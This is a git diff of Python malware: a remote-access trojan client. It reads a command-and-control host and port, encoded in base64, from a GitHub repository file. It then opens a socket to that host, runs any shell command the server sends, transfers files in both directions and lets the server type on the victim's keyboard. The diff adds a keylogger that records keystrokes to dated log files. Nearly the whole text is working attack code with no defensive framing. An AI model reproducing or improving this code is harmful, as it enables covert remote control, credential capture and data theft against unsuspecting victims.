@@ -1,12 +1,56 @@
-import socket , threading , os , subprocess , time , pyautogui , requests , base64
+import socket 
+import threading 
+import os 
+import subprocess 
+import time 
+import pyautogui 
+import requests 
+import base64
+from datetime import datetime
+from pynput.keyboard import Listener
+
+
+
+############################ connecting to server ###################################################
 
 def server_ip(repo):
-	r = requests.get(f'https://api.github.com/repos/indrajith69/{repo}/contents/ip_address.txt?ref=master')
-	req=bytes(r.json()['content'],encoding='utf-8')
+	r   = requests.get(f'https://api.github.com/repos/indrajith69/{repo}/contents/ip_address.txt?ref=master')
+	req = bytes(r.json()['content'],encoding='utf-8')
 	host,port=base64.decodebytes(req).decode('utf8').split(':')
 	return host,int(port)
 
 	
+def reconnect():
+	pass
+
+############################ connecting to server ###################################################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+############################# MESSING WITH THIER FILES! #############################################
+
+
 
 def recv_b_file(name,size=1024):
 	with open(name,'wb') as f:
@@ -42,10 +86,6 @@ def send_b_file(path,size=1024):
 
 
 
-
-
-
-
 def recv_t_file(name,size=1024):
 	with open(name,'wb') as f:
 		while True:
@@ -77,6 +117,7 @@ def send_t_file(path,size=1024):
 
 
 
+############################# MESSING WITH THIER FILES! #############################################
 
 
 
@@ -86,6 +127,21 @@ def send_t_file(path,size=1024):
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+########################## HACKING SCRIPTS ###########################################################
 
 
 def keyboard(option,size=1024):
@@ -108,17 +164,84 @@ def keyboard(option,size=1024):
 		while True:
 			string = client.recv(size).decode('utf-8')
 			if string=='exit':
-				client.send('exited'.encode('utf-8'))
 				return
-			for i in string:
-				pyautogui.typewrite(i)
+
+
+			elif '~' in string:
+				hot_keys = []
+				words = string.split('~')
+
+				for word in words:
+					if word in hot_keys:
+						hkey = word.split('+')[0]
+						if len(hkey.split('+'))>1 and word.split('+')[0]!='':
+							pyautogui.hotkey(*word.split('+'))
+						else:
+							pyautogui.keyDown(hkey.replace('+',''))
+
+					else:
+						for char in word:
+							pyautogui.typewrite(char)
 
 
 
-def demo():
-	pass
+			else:
+				for i in string:
+					pyautogui.typewrite(i)
 
 
+
+
+
+
+
+def keylogger(finish_time):
+	string = ''
+	file_name = str(datetime.today().date())+'.txt'
+	path = os.path.join('logs',file_name)
+
+	def write(key):
+		nonlocal l,string
+		key=str(key)
+		with open(path,'a') as f:
+			if datetime.now().minute >= finish_time:
+				f.write(string+'\n')
+				l.stop()
+			else:
+				if key=='Key.enter':
+					f.write(string+'\n')
+					string=''
+
+				elif key=='Key.space':
+					string+=' '
+	
+				elif 'Key' in key:
+					string+='~'+key+'~'
+
+				else:
+					string+=key.replace("'","")
+
+	with Listener(on_press=write) as l:
+		if 'logs' not in os.listdir():
+			os.mkdir('logs')
+		l.join()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+########################## HACKING SCRIPTS ###########################################################
 
 
 
@@ -184,9 +307,13 @@ def trojan():
 			os.chdir(server_command.split()[1])
 			client.send(os.getcwd().encode('utf-8'))
 
+		elif server_command=='pwd':
+			client.send(os.getcwd().encode('utf-8'))
+
 		elif server_command=='keyboard access':
 			option=int(client.recv(1024).decode('utf-8'))
 			keyboard(option)
+			break
 
 		else:
 			p1=subprocess.run(server_command,shell=True,capture_output=True,text=True)
@@ -201,12 +328,5 @@ def trojan():
 
 
 
-
-
-'''t1=threading.Thread(target=demo)
-t2=threading.Thread(target=trojan)
-
-t1.start()
-t2.start()'''
 
 trojan()
